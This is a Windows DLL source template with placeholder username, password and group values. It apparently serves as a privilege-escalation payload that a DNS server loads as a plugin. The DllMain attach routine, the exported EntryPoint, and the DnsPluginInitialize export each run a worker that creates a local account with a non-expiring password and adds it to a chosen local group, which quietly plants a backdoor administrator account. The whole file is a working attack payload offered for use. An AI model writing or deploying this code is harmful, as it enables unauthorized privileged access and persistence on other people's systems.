#include <windows.h>
#include <lm.h>

#pragma comment(lib, "netapi32.lib")

#define USERNAME L"{{USERNAME}}"
#define PASSWORD L"{{PASSWORD}}"
#define GROUPNAME L"{{GROUPNAME}}"

DWORD WINAPI WorkerThread(LPVOID lpParam) {
    USER_INFO_1 ui;
    ZeroMemory(&ui, sizeof(ui));
    ui.usri1_name = (LPWSTR)USERNAME;
    ui.usri1_password = (LPWSTR)PASSWORD;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
    
    DWORD dwError;
    NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
    
    LOCALGROUP_MEMBERS_INFO_3 member;
    member.lgrmi3_domainandname = (LPWSTR)USERNAME;
    NetLocalGroupAddMembers(NULL, GROUPNAME, 3, (LPBYTE)&member, 1);
    
    return 0;
}

extern "C" __declspec(dllexport) DWORD WINAPI DnsPluginInitialize(PVOID a, PVOID b) {
    HANDLE h = CreateThread(NULL, 0, WorkerThread, NULL, 0, NULL);
    if (h) CloseHandle(h);
    return 0;
}

extern "C" __declspec(dllexport) DWORD WINAPI DnsPluginCleanup() {
    return 0;
}

extern "C" __declspec(dllexport) DWORD WINAPI DnsPluginQuery(PSTR a, WORD b, PSTR c, PVOID d) {
    return 0;
}

extern "C" __declspec(dllexport) void EntryPoint(HWND a, HINSTANCE b, LPSTR c, int d) {
    WorkerThread(NULL);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        HANDLE h = CreateThread(NULL, 0, WorkerThread, NULL, 0, NULL);
        if (h) CloseHandle(h);
    }
    return TRUE;
}